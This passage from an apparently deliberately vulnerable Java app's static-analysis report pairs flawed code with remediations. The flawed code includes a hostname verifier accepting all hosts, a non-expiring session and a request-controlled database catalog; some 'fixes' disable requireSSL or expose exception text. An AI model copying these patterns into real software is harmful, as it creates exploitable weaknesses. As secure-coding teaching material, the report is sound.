&lt;http-only&gt;true&lt;/http-only&gt;\n\t\t&lt;secure&gt;true&lt;/secure&gt;\n    &lt;/cookie-config&gt;\n &lt;/session-config&gt;", "nonvulncode": "<em class=\"bold\">web.xml</em>\n&lt;session-config&gt;\n<em class=\"blue\">&lt;session-timeout&gt;15&lt;/session-timeout&gt; // session timeout in minutes</em>\n    &lt;cookie-config&gt;\n        &lt;http-only&gt;true&lt;/http-only&gt;\n\t\t&lt;secure&gt;true&lt;/secure&gt;\n    &lt;/cookie-config&gt;\n &lt;/session-config&gt;", "comments": "Longer session timeouts will give oppurtunity to attackers to explore the application for long time, also prevent memory from being released. If the session timeout is zero or negative, session will not time out. Default session timeout, configured in apache tomcat 8 is 30minutes.\n\nAccording to OWASP both the idle and absolute timeout values are highly dependent on how critical the web application and its data are. Common idle timeouts ranges are 2-5 minutes for high-value applications and 15-30 minutes for low risk applications.\n\nThe default timeout is 30 minutes if the you don't specify it in the config file.\n\nConfirm with business the proper session timeout values to be used. Refer to the client's security policies for the specific value for session timeout. If unavailable, use the value above as recommended but it really depends on the type of application, for instance banking applications use a low number of minutes to protect the users when using shared computers. In other cases, if the device is trusted, the session time-out can be set to many days (e.g., validating Chrome using the Symantec plugin to trust the device, and not ask user to authenticate again).\nIt is possible to programmatically set session time out for a web application by using the setSessionTimeout() method of the ServletContext interface before the servlet context is initialized.\n\nFor more information, refer to: https://stackoverflow.com/questions/17812994/forms-authentication-timeout-vs-sessionstate-timeout\n\nNote: The form timeout value unit is MINUTES.", "impact": "No impact in case the business accepts to decrease the timeout.\nThe impact will be medium/high in case the application needs to implement new a session strategy to use an external SSO or Authentication Client.", "abstract": "Protect the applciation with session timeout."}, {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">web.xml</em>\n&lt;session-config&gt;\n<em class=\"red\">&lt;session-timeout&gt;-1&lt;/session-timeout&gt;</em>\n    &lt;cookie-config&gt;\n        &lt;http-only&gt;true&lt;/http-only&gt;\n\t\t&lt;secure&gt;true&lt;/secure&gt;\n    &lt;/cookie-config&gt;\n &lt;/session-config&gt;", "nonvulncode": "<em class=\"blue\">EmployeeFilter.java</em>\n\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) {\n\t\t <em class=\"blue\"> HttpSession session = request.getSession();    \n\t\t    session.setMaxInactiveInterval(300);    // session timeout in seconds </em>\n\t  }", "comments": "Longer session timeouts will give oppurtunity to attackers to explore the application for long time, also prevent memory from being released. If the session timeout is zero or negative, session will not time out. Default session timeout, configured in apache tomcat 8 is 30minutes.\n\nAccording to OWASP both the idle and absolute timeout values are highly dependent on how critical the web application and its data are. Common idle timeouts ranges are 2-5 minutes for high-value applications and 15-30 minutes for low risk applications.\n\nThe default timeout is 30 minutes if the you don't specify it in the config file.\n\nConfirm with business the proper session timeout values to be used. Refer to the client's security policies for the specific value for session timeout. If unavailable, use the value above as recommended but it really depends on the type of application, for instance banking applications use a low number of minutes to protect the users when using shared computers. In other cases, if the device is trusted, the session time-out can be set to many days (e.g., validating Chrome using the Symantec plugin to trust the device, and not ask user to authenticate again).\nIt is possible to programmatically set session time out for a web application by using the setSessionTimeout() method of the ServletContext interface before the servlet context is initialized.\n\nFor more information, refer to: https://stackoverflow.com/questions/17812994/forms-authentication-timeout-vs-sessionstate-timeout\n\nNote: The form timeout value unit is MINUTES.", "impact": "No impact in case the business accepts to decrease the timeout.\nThe impact will be medium/high in case the application needs to implement new a session strategy to use an external SSO or Authentication Client.", "abstract": "Protect the applciation with session timeout."}]}, "mitigations": {"mitigation": {"system": "Web Server / IIS", "configuration": "web.config", "backend": "&lt;system.web&gt;\n    ...\n    &lt;authentication mode=&quot;Forms&quot;&gt;\n      &lt;forms loginUrl=&quot;~/Home/Login&quot; timeout=&quot;15&quot; protection=&quot;None&quot; requireSSL=&quot;false&quot;&gt;&lt;/forms&gt;\n    &lt;/authentication&gt;\n  &lt;/system.web&gt;", "frontend": "N/A", "comments": "Set an authentication timeout that is 15 minutes or less, depending on the functional requirements (e.g. for bank applications may be required to timout after 5 min). This both allows users to interact with the application (remember the timeout will restart counting if user interact with the application) over a period of time and provides a smaller time window for attackers to exploit the application.\nBe mindful of any internal functionality (e.g. periodig image refresh or Ajax request that prevents the timeout). In this case, the application must implement other mechanisms to enforce the timeout period defined by the requirements and policies."}}}}}, "JavaScript Hijacking": {"language": "JAVA", "files": [{"file": "WebContent/WEB-INF/jspViews/listStudentGradeJSON.jsp", "items": [{"id": "IN00463", "function": "FunctionPointerCall: open()", "line": "12", "snippet": "var req  = new XMLHttpRequest();\n//created json file kept in webapp folder to be read\nreq.open(\"GET\", \"user_info.json\", true); \nreq.onreadystatechange = function() {\n  if (req.status == 200 && req.readyState == 4) {"}]}], "remediation": null}, "Object Model Violation: Erroneous clone() Method": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00467", "function": "Function: clone()", "line": "31", "snippet": "private EmployeeDAOImpl empImp;\n\t\n\tpublic Object clone() throws CloneNotSupportedException {\n\t\ttry {\n\t\t\tgetStudentSubjectGradeList(null,null);"}]}], "remediation": null}, "Obsolete": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00468", "function": "createJsonGenerator()", "line": "345", "snippet": "File jsonFile = new File(fileName);\n\t\t\t\n\t        JsonGenerator jGenerator = jfactory.createJsonGenerator(jsonFile, JsonEncoding.UTF8);\n\n\t        jGenerator.writeStartObject();"}]}], "remediation": null}, "Poor Error Handling: Empty Catch Block": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00472", "function": "CatchBlock()", "line": "107", "snippet": "HttpsURLConnection.setDefaultHostnameVerifier((s, sslSession) -> true);\n\t    } catch (GeneralSecurityException e) {\n\t        // ignore\n\t    }"}]}], "remediation": {"remediation": {"@id": "R.0016", "@name": "Poor Error Handling: Empty Catch Block", "@dateLastModified": "8/7/2020", "faqs": {"faq": {"question": "what is the problem of catching an Exceptions and leaving it empty?", "answer": "This is a form of code quality issue. Do not catch an exception if you cannot process it. The expectation for availability is that the application should recover or fail gracefully in case of exceptions, just the method will not work and it will still proceed with other parts of the application logic whenever possible.  Applications should only produce errors for unhandled exception types."}}, "recommendations": {"recommendation": [{"@type": ".Net", "vulncode": "public ActionResult CreateEmployee(Employee employee)\n        {\n            try\n            {\n                VulnAppDBEntities dbContext = new VulnAppDBEntities();\n                dbContext.Employees.Add(employee);\n                dbContext.SaveChanges();\n       <em class=\"red\">     }catch(Exception)\n            {\n\n            }</em>\n            return View();\n        }", "nonvulncode": "public ActionResult CreateEmployee(Employee employee)\n        {\n            try\n            {\n                VulnAppDBEntities dbContext = new VulnAppDBEntities();\n                dbContext.Employees.Add(employee);\n                dbContext.SaveChanges();\n            }\n            }<em class=\"blue\">catch(SqlException SqlEx)</em>\n                {\n                  <em class=\"blue\">  TempData[&quot;errmsg&quot;] = &quot;SqlException encountered: &quot; + SqlEx.Message;\n                    logger.Error(&quot;SqlException encountered: &quot; + SqlEx.Message);</em>\n                }\n                catch(Exception ex)\n                {\n                   <em class=\"blue\"> TempData[&quot;errmsg&quot;] = &quot;Exception encountered: &quot; + ex.Message;\n                    logger.Error(&quot;Exception encountered: &quot; + ex.Message);</em>\n                }\n            return View();\n        }", "comments": "If catching an exception don't leave the catch block empty, make sure there is a proper exception handling in place (e.g.: logging it to log file or informing a user that there is an issue).\n\nUsing the example with the vulnerable code, let say you did not put any validation in any of the fields and user inputted a non-numeric to a Salary field. With this scenario, this should fail because this field should only accept decimal value and you are informing anything back to the user that there is an issue. \n\nMake the application to fail safe, securely and gracefully. \n\nReference: https://owasp.org/www-community/Fail_securely", "impact": "Determining business logic to treat all possible exceptions caught and align with the other teams how to handle / create tickets for exceptions on the code.", "abstract": "Using logger"}, {"@type": "JAVA/JSP", "vulncode": "public Map&lt;Integer, String&gt; getDepartmentMap() throws Exception {\n\t\tMap&lt;Integer, String&gt; departmentMap = new HashMap&lt;Integer, String&gt;();\n\t\ttry {\n\t      departmentMap = employeeService.getDepartmentMap();\n\t\t} <em class=\"red\">catch(ClassCastException e) {\n\t\t\t\n\t\t} catch (SQLException e) {\n\t\t\t\n\t\t} catch (Exception e) {\n\t\t}</em>\t      \n\t      return departmentMap;\n\t   }", "nonvulncode": "public Map&lt;Integer, String&gt; getDepartmentMap() throws Exception {\n\t\tMap&lt;Integer, String&gt; departmentMap = new HashMap&lt;Integer, String&gt;();\n\t\ttry {\n\t      departmentMap = employeeService.getDepartmentMap();\n\t\t} <em class=\"blue\">catch(ClassCastException e) {\n\t\t\tlogger.error(&quot;Error in fetching department values&quot;, e);\n\t    \tModelAndView mv = new ModelAndView();\n\t\t\tmv.setViewName(&quot;failure&quot;);\n\t        mv.addObject(&quot;msg&quot;, &quot;Error in fetching department values&quot;);\n\t\t} catch (SQLException e) {\n\t\t\tlogger.error(&quot;Error in fetching department values&quot;, e);\n\t    \tModelAndView mv = new ModelAndView();\n\t\t\tmv.setViewName(&quot;failure&quot;);\n\t        mv.addObject(&quot;msg&quot;, &quot;Error in fetching department values&quot;);\n\t\t}</em> <em class=\"blue\">catch (Exception e) {\n\t\t\tlogger.error(&quot;Error in fetching department values&quot;, e);\n\t    \tModelAndView mv = new ModelAndView();\n\t\t\tmv.setViewName(&quot;failure&quot;);\n\t        mv.addObject(&quot;msg&quot;, &quot;Error in fetching department values&quot;);\n\t\t}</em>\n\t      \n\t      return departmentMap;\n\t   }", "comments": "If catching an exception don't leave the catch block empty, make sure there is a proper exception handling in place (e.g.: logging it to log file or informing a user that there is an issue).\n\nWith the vulnerable code, the program records no evidence indicating the special situation, potentially the program will bury the issue and would continue to execute as though nothing unusual had occurred, or may get into an invalid state with no note to production team.\n\nIt is always recommended to log a business message with information on where the error occurred, and provide valid error message to user during exception scenario.\n\nMake the application to fail safe, securely and gracefully. \n\nReference: https://owasp.org/www-community/Fail_securely", "impact": "Determining business logic to treat all possible exceptions caught and align with the other teams how to handle / create tickets for exceptions on the code.", "abstract": "Using logger and proper redirection to respective error page"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Poor Error Handling: Throw Inside Finally": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00473", "function": "FinallyBlock()", "line": "245", "snippet": "logger.error(\"Exception occured during user list\" + e.getMessage());\n\t\t}\n\t\tfinally {\t\t\t\n\t\t\tif (conn != null) {\n\t\t\t\tif (exception != null) {"}]}], "remediation": {"remediation": {"@id": "R.0148", "@name": "Poor Error Handling: Throw Inside Finally", "@dateLastModified": "7/27/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult Employees(int departmentID, int param)\n        {\n            VulnAppDBEntities dBContext = new VulnAppDBEntities();\n            List&lt;Employee&gt; emplist = null;\n            try\n            {\n                emplist= dBContext.Employees.Where(emp =&gt; emp.DepartmentId == departmentID).ToList();\n                foreach (var item in emplist)\n                {\n                    item.Salary = item.Salary / param;\n                }\n            }\n            catch (SqlException sqlEx)\n            {  \n                ViewData[&quot;ErrorMessage&quot;] = &quot;An SQL error has occured. &quot; + sqlEx.Message.ToString();\n            }\n            catch (Exception ex)\n            {  \n                ViewData[&quot;ErrorMessage&quot;] = &quot;An error occurred on this page. &quot; + ex.Message.ToString();\n            }\n            finally\n            {\n                if (param == 0)\n                    throw new DivideByZeroException();\n <em class=\"red\">            </em>  if (dBContext != null)\n                  dBContext.Dispose();\n            }\n            return View(emplist);\n        }", "nonvulncode": "public ActionResult Employees(int departmentID, int param)\n        {\n            VulnAppDBEntities dBContext = new VulnAppDBEntities();\n            List&lt;Employee&gt; emplist = null;\n            try\n            {\n                emplist= dBContext.Employees.Where(emp =&gt; emp.DepartmentId == departmentID).ToList();\n                foreach (var item in emplist)\n                {\n                    item.Salary = item.Salary / param;\n                }\n            }\n            catch (SqlException sqlEx)\n            {  \n                ViewData[&quot;ErrorMessage&quot;] = &quot;An SQL error has occured. &quot; + sqlEx.Message.ToString();\n            }\n            catch (Exception ex)\n            {  \n                ViewData[&quot;ErrorMessage&quot;] = &quot;An error occurred on this page. &quot; + ex.Message.ToString();\n                <em class=\"blue\"> throw ex;</em>\n            }\n            finally\n            {\n                if (dBContext != null)\n                  dBContext.Dispose();\n            }\n            return View(emplist);\n        }", "comments": "**EXAMPLE IN .NET FOR REFERENCE ONLY. FORTIFY DETECTS ONLY IN JAVA CODE THIS VULNERABILTY**\n\nIn the example of Vulnerable code, the code throws an exception before reaching the end of the finally. This means the program flow will not execute the remain code for disposing the dBContext. All code after throwing an exception inside a finally block will never be executed. \n\nAnother reason to avoid throwing inside a finally is that, in case the code raises an exception, it will be overloaded by the one generated inside the finally block. Any exception treatment for the original one, will not be executed.\n\nIf the code needs to re-throw an exception, the recommendation is do it in the catch block. The normal finally block execution (e.g., to  clean up resources) will run even if there is a throw in the catch block.\n\nIn .Net consider &quot;using&quot; inside the try..catch block to call autoclose on the resources without the need to to it on the finally block.", "impact": null, "abstract": "Use of throw in catch"}, {"@type": "JAVA/JSP", "vulncode": "public List&lt;UserAccountBean&gt; listUser() throws SQLException {\n\t\t\n\t\tList&lt;UserAccountBean&gt; listUsers = new ArrayList&lt;UserAccountBean&gt;();\n\t\tConnection conn = null;\n\t\t\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\t\t//File absolute path given, absolute path should begin with /\n\n\t\tProperties prop = new Properties();\t\t\n\t\tprop.load(input);\n\t\t\n\t\tString dbURL = prop.getProperty(&quot;sec_db_url&quot;);\n\t\tString dbuser = prop.getProperty(&quot;sec_user&quot;);\n\t\tString dbpwd = prop.getProperty(&quot;sec_password&quot;);\n\t\t\n\t\tconn = DriverManager.getConnection(dbURL,dbuser , dbpwd);\n\t\t\n\t\tStatement stmt = conn.createStatement();\n\t\tString sql = &quot;SELECT Username, Password, RoleID from account&quot;;\n\t\tResultSet rs = stmt.executeQuery(sql);\n\t\t\n\t\twhile(rs.next()) {\n\t\t\tUserAccountBean userAccount = new UserAccountBean();\n\t\t\t\n\t\t\tuserAccount.setUserName(rs.getString(&quot;Username&quot;));\n\t\t\tuserAccount.setPwd(rs.getString(&quot;Password&quot;));\n\t\t\tuserAccount.setRoleID(rs.getString(&quot;RoleID&quot;));\n\t\t\t\n\t\t\tlistUsers.add(userAccount);\n\t\t}\n\n\t\t} catch (FileNotFoundException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (SQLException e) {\n\t\t\te.printStackTrace();\n\t\t} finally {\n\n\t\t\tif (conn!= null)\n\t\t\t\ttry {\n\t\t\t\t\tconn.close();\n\t\t\t\t} catch (SQLException e) {\n\t\t\t\t\tthro<em class=\"red\">w e;\n\t\t\t\t}\n\t\t}</em>\n\t\t\t\t\n\t\treturn listUsers;\n\t}", "nonvulncode": "public List&lt;UserAccountBean&gt; listUser() throws SQLException {\n\t\t\n\t\tList&lt;UserAccountBean&gt; listUsers = new ArrayList&lt;UserAccountBean&gt;();\n\t\t\t\t\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\t\t//File absolute path given, absolute path should begin with /\n\n\t\t\tProperties prop = new Properties();\t\t\n\t\t\tprop.load(input);\n\t\t\tString dbURL = prop.getProperty(&quot;sec_db_url&quot;);\n\t\t\tString dbuser = prop.getProperty(&quot;sec_user&quot;);\n\t\t\tString dbpwd = prop.getProperty(&quot;sec_password&quot;);\t\t\n\t\t\n\t\t\t<em class=\"blue\">try (Connection conn = DriverManager.getConnection(dbURL, dbuser, dbpwd)) {</em>\n\n\t\t\t\tStatement stmt = conn.createStatement();\n\t\t\t\tString sql = &quot;SELECT Username, Password, RoleID from account&quot;;\n\t\t\t\tResultSet rs = stmt.executeQuery(sql);\n\n\t\t\t\twhile (rs.next()) {\n\t\t\t\t\tUserAccountBean userAccount = new UserAccountBean();\n\n\t\t\t\t\tuserAccount.setUserName(rs.getString(&quot;Username&quot;));\n\t\t\t\t\tuserAccount.setPwd(rs.getString(&quot;Password&quot;));\n\t\t\t\t\tuserAccount.setRoleID(rs.getString(&quot;RoleID&quot;));\n\n\t\t\t\t\tlistUsers.add(userAccount);\n\t\t\t\t}\n\t\t\t} \n\t\t\t\n\t\t\tcatch (SQLException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}\n\t\t\n\t\t} catch (FileNotFoundException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t} \n\t\treturn listUsers;\n\t}", "comments": "Reason to avoid throwing inside a finally is that, in case the code raises an exception, it will be ovrloaded by the one generated inside the finally block. Any exception treatment for the original one, will not be executed.\n\nIf the code needs to re-throw an exception, the recommendation is do it in the catch block. The normal finally block execution (e.g., to  clean up resources) will run even if there is a throw in the catch block.\n\nIn JAVA consider using try with resource to call autoclose on the resources without the need to to it on the finally block.\n\nFor reference : https://www.oracle.com/technical-resources/articles/java/trywithresources.html", "impact": null, "abstract": "Use of try-with-resources"}, {"@type": "JAVA/JSP", "vulncode": "public List&lt;UserAccountBean&gt; listUser() throws SQLException {\n\t\t\n\t\tList&lt;UserAccountBean&gt; listUsers = new ArrayList&lt;UserAccountBean&gt;();\n\t\tConnection conn = null;\n\t\t\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\t\t//File absolute path given, absolute path should begin with /\n\n\t\tProperties prop = new Properties();\t\t\n\t\tprop.load(input);\n\t\t\n\t\tString dbURL = prop.getProperty(&quot;sec_db_url&quot;);\n\t\tString dbuser = prop.getProperty(&quot;sec_user&quot;);\n\t\tString dbpwd = prop.getProperty(&quot;sec_password&quot;);\n\t\t\n\t\tconn = DriverManager.getConnection(dbURL,dbuser , dbpwd);\n\t\t\n\t\tStatement stmt = conn.createStatement();\n\t\tString sql = &quot;SELECT Username, Password, RoleID from account&quot;;\n\t\tResultSet rs = stmt.executeQuery(sql);\n\t\t\n\t\twhile(rs.next()) {\n\t\t\tUserAccountBean userAccount = new UserAccountBean();\n\t\t\t\n\t\t\tuserAccount.setUserName(rs.getString(&quot;Username&quot;));\n\t\t\tuserAccount.setPwd(rs.getString(&quot;Password&quot;));\n\t\t\tuserAccount.setRoleID(rs.getString(&quot;RoleID&quot;));\n\t\t\t\n\t\t\tlistUsers.add(userAccount);\n\t\t}\n\n\t\t} catch (FileNotFoundException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (SQLException e) {\n\t\t\te.printStackTrace();\n\t\t} finally {\n\n\t\t\tif (conn!= null)\n\t\t\t\ttry {\n\t\t\t\t\tconn.close();\n\t\t\t\t} catch (SQLException e) {\n\t\t\t\t\tthro<em class=\"red\">w e;\n\t\t\t\t}\n\t\t}</em>\n\t\t\t\t\n\t\treturn listUsers;\n\t}", "nonvulncode": "public List&lt;UserAccountBean&gt; listUser() throws SQLException {\n\t\t\n\t\tList&lt;UserAccountBean&gt; listUsers = new ArrayList&lt;UserAccountBean&gt;();\t\t\n\t\tConnection conn = null;\n\t\t<em class=\"blue\">FileNotFoundException exception =null;</em>\n\t\t\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\t\t//File absolute path given, absolute path should begin with /\n\n\t\t\tProperties prop = new Properties();\t\t\n\t\t\tprop.load(input);\n\t\t\tString dbURL = prop.getProperty(&quot;sec_db_url&quot;);\n\t\t\tString dbuser = prop.getProperty(&quot;sec_user&quot;);\n\t\t\tString dbpwd = prop.getProperty(&quot;sec_password&quot;);\t\t\n\t\t\n\t\t\tconn = DriverManager.getConnection(dbURL,dbuser , dbpwd);\n\t\t\tStatement stmt = conn.createStatement();\n\t\t\tString sql = &quot;SELECT Username, Password, RoleID from account&quot;;\n\t\t\tResultSet rs = stmt.executeQuery(sql);\n\n\t\t\t\twhile (rs.next()) {\n\t\t\t\t\tUserAccountBean userAccount = new UserAccountBean();\n\n\t\t\t\t\tuserAccount.setUserName(rs.getString(&quot;Username&quot;));\n\t\t\t\t\tuserAccount.setPwd(rs.getString(&quot;Password&quot;));\n\t\t\t\t\tuserAccount.setRoleID(rs.getString(&quot;RoleID&quot;));\n\n\t\t\t\t\tlistUsers.add(userAccount);\n\t\t\t\t}\n\t\t} catch (FileNotFoundException e) {\n\t\t\t<em class=\"blue\">exception= e;</em>\n\t\t\te.printStackTrace();\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t} \n\t\tfinally {\n\t\t\tif (conn != null) {\n\t\t\t\tif(exception!=null) {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tconn.close();\n\t\t\t\t\t} catch (SQLException e) {\n\t\t\t\t\t\t<em class=\"blue\">logger.debug(&quot;Exception occurred while closing connection.&quot;+e.getMessage());\n\t\t\t\t\t\texception.addSuppressed(e);\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tconn.close();\n\t\t\t\t}\n\t\t\t} \n\t\t}\n\t\t\t \n\t\t\t\t\n\t\treturn listUsers;\n\t}</em>", "comments": "Generally, methods in the finally block are 'cleanup' codes (Closing the Connection, etc), so we can just absord the exception and log the message instead of throwing it. Also to avoid exception from finally overriding previous exception, we can use &quot;addsuppressed&quot; to add the previous exception as shown in the sample.", "impact": "Use of log and adding the exceptions without letting it suppressed", "abstract": null}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Process Control": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00475", "function": "loadLibrary()", "line": "485", "snippet": "public void loadLibrary (String libName) {\n\t\tSystem.loadLibrary(libName);\n\t}\n\t/*"}]}], "remediation": null}, "Setting Manipulation": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/EmployeeDAOImpl.java", "items": [{"id": "IN00477", "function": "org.springframework.mail.javamail.JavaMailSenderImpl.setHost()", "line": "255", "snippet": "JavaMailSenderImpl mailSender = new JavaMailSenderImpl();\n\t\t\t    mailSender.setHost(host);\n\t\t\t    mailSender.setPort(587);"}]}], "remediation": {"remediation": {"@id": "R.0022", "@name": "Setting Manipulation", "@dateLastModified": "1/13/2021", "faqs": null, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">DAO:\n</em>public List&lt;StudentSubjectGradeBean&gt; getStudentSubjectGradeList(String userName,String datasourcename) throws NamingException, SQLException {\n\t\t\n\t\tConnection conn=null;\n\t\tList&lt;StudentSubjectGradeBean&gt; studGradeList = new ArrayList&lt;StudentSubjectGradeBean&gt;();\n\t\t\n\t\tInitialContext ctx = new InitialContext(); \n\t\tDataSource datasource = (DataSource)ctx.lookup(&quot;java:comp/env/jdbc/UsersDB&quot;); \n\t      if (datasource != null) {\n\t        conn = datasource.getConnection();\n<em class=\"red\">conn.setCatalog(datasourcename);\n</em>\t      }\n.....\n}\n<em class=\"bold\">Controller:\n</em>\n\tpublic ModelAndView listStudentGrade(HttpServletRequest request) throws SQLException, NamingException\n\t{\n\t\tlogger.debug(&quot;Enter StudentSubjectGradeList&quot;);\n\t\tCookie[] cookies =request.getCookies();\n\t\t\n\t\tString userName = request.getParameter(&quot;userName&quot;);\n\t\t<em class=\"red\">String datasourcename = request.getParameter(&quot;dataSource&quot;);</em>\n\t\t.....\n\t\tif(&quot;role000002&quot;.equals(userRole) && loggedinUser.equals(userName)) {\n\t\t\tlistStudents= studentDAO.getStudentSubjectGradeList(userName,<em class=\"red\">datasourcename</em>);\n\t\t}", "nonvulncode": "<em class=\"bold\">Controller:\n</em>\n\tpublic ModelAndView listStudentGrade(HttpServletRequest request) throws SQLException, NamingException\n\t{\n\t\t\t\t\n\t\tString userName = request.getParameter(&quot;userName&quot;);\n\t\tString permission = request.getParameter<em class=\"blue\">(&quot;permission&quot;);\nMap&lt;String,String&gt; datasourceMap = new HashMap&lt;String,String&gt;();\n\t\tdatasourceMap.put(&quot;Admin&quot;, &quot;VulnAppAdminDB&quot;);\n\t\tdatasourceMap.put(&quot;User&quot;, &quot;VulnAppUsersDB&quot;);\n\t\t\n\t\tString datasourcename = datasourceMap.get(permission);\n</em>\t\t.....\n\t\tif(loggedinUser.equals(userName)) {\n\t\t\tlistStudents= studentDAO.getStudentSubjectGradeList(userName,<em class=\"blue\">datasourcename</em>);\n\t\t}\n<em class=\"bold\">DAO:</em>\npublic List&lt;StudentSubjectGradeBean&gt; getStudentSubjectGradeList(String userName,<em class=\"blue\">String datasourcename</em>) throws NamingException, SQLException {\n\t\t\n\t\tConnection conn=null;\n\t\tList&lt;StudentSubjectGradeBean&gt; studGradeList = new ArrayList&lt;StudentSubjectGradeBean&gt;();\n\t\t\n\t\tInitialContext ctx = new InitialContext(); \n\t\tDataSource datasource = (DataSource)ctx.lookup(<em class=\"blue\">&quot;java:comp/env/jdbc/UsersDB&quot;</em>); \n\t      if (datasource != null) {\n\t        conn = datasource.getConnection();\nconn.setCatalog(<em class=\"blue\">datasourcename</em>);\n\t      }\n.....\n}", "comments": "In the vulnerable sample, the application is sending the databasename from request directly to set catalog name, an attacker can connect to unauthorized database if the datasource name is set without proper input validation.\nInstead of getting the datasourcename directly from user, datasourcename can be fetched from predefined data.\nIn case of multiple possible values, where the user selects the table to use, it is recommended to pre-set the mapping and get from the user an index only (e.g., case 1: use tableA; case 2: use table B; default: error).", "impact": "Need to map the possible datasourcename parameters and create a functional map for those (preference to use an external and protected config file for easy maintenance.\nNo impact on performance or other functionalities.", "abstract": "Use of proper input validation"}, {"@type": ".NET/C#/ASP", "vulncode": "public ActionResult Employees(string database)\n        {\n            SqlConnectionStringBuilder DBconnbuilder = new SqlConnectionStringBuilder(&quot;Data Source = localhost; Integrated Security=true;&quot;);\n            <em class=\"red\">DBconnbuilder[&quot;Database&quot;] = database;</em>\n            using (SqlConnection con = new SqlConnection(DBconnbuilder.ConnectionString))\n            {\n                con.Open();\n                using (SqlCommand command = new SqlCommand(&quot;Select EmployeeId,Name,Gender,City,Salary,DepartmentId,SocialSecurityNo From dbo.Employee&quot;, con))\n                {\n                    SqlDataReader reader = command.ExecuteReader();\n                    List&lt;Employee&gt; listEmployee = new List&lt;Employee&gt;();\n                    while (reader.Read())\n                    {\n                        Employee empl = new Employee();\n                        empl.EmployeeId = Convert.ToInt32(reader[&quot;EmployeeId&quot;]);\n                        empl.Name = reader[&quot;Name&quot;].ToString();\n                        empl.Gender = reader[&quot;Gender&quot;].ToString();\n                        empl.City = reader[&quot;City&quot;].ToString();\n                        empl.Salary = Convert.ToDecimal(reader[&quot;Salary&quot;]);\n                        empl.DepartmentId = Convert.ToInt32(reader[&quot;DepartmentId&quot;]);\n                        empl.SocialSecurityNo = reader[&quot;SocialSecurityNo&quot;].ToString();\n                        listEmployee.Add(empl);\n                    }\n                    return View(listEmployee);\n                }\n            }\n        }", "nonvulncode": "public ActionResult Employees(string user)\n        {\n           //in real scenario this must be retrieve fro\n<em class=\"blue\">            Dictionary&lt;string, string&gt; User_Array = new Dictionary&lt;string, string&gt;();\n            User_Array.Add(&quot;admin&quot;, &quot;VulnAppDB&quot;);\n            User_Array.Add(&quot;user&quot;, &quot;VulnAppDB_User&quot;);\n\n            string databaseName = User_Array[user]; \n</em>\n            SqlConnectionStringBuilder DBconnbuilder = new SqlConnectionStringBuilder(&quot;Data Source = localhost; Integrated Security=true;&quot;);\n            DBconnbuilder[&quot;Database&quot;] = databaseName;\n            using (SqlConnection con = new SqlConnection(DBconnbuilder.ConnectionString))\n            {\n                con.Open();\n                using (SqlCommand command = new SqlCommand(&quot;Select EmployeeId,Name,Gender,City,Salary,DepartmentId,SocialSecurityNo From dbo.Employee&quot;, con))\n                {\n                    SqlDataReader reader = command.ExecuteReader();\n                    List&lt;Employee&gt; listEmployee = new List&lt;Employee&gt;();\n                    while (reader.Read())\n                    {\n                        Employee empl = new Employee();\n                        empl.EmployeeId = Convert.ToInt32(reader[&quot;EmployeeId&quot;]);\n                        empl.Name = reader[&quot;Name&quot;].ToString();\n                        empl.Gender = reader[&quot;Gender&quot;].ToString();\n                        empl.City = reader[&quot;City&quot;].ToString();\n                        empl.Salary = Convert.ToDecimal(reader[&quot;Salary&quot;]);\n                        empl.DepartmentId = Convert.ToInt32(reader[&quot;DepartmentId&quot;]);\n                        empl.SocialSecurityNo = reader[&quot;SocialSecurityNo&quot;].ToString();\n                        listEmployee.Add(empl);\n                    }\n                    return View(listEmployee);\n                }\n            }\n        }", "comments": "In the vulnerable sample, the application is sending the databasename from request directly to set database, an attacker can connect to unauthorized database if the datasource name is set without proper input validation.\nInstead of getting the database name directly from user, database can be fetched from predefined data.\nIn case of multiple possible values, where the user selects the table to use, it is recommended to pre-set the mapping and get from the user an index only (e.g., case 1: use tableA; case 2: use table B; default: error).", "impact": "Need to map the possible datasourcename parameters and create a functional map for those (preference to use an external and protected config file for easy maintenance.\nNo impact on performance or other functionalities.", "abstract": "Use of proper input 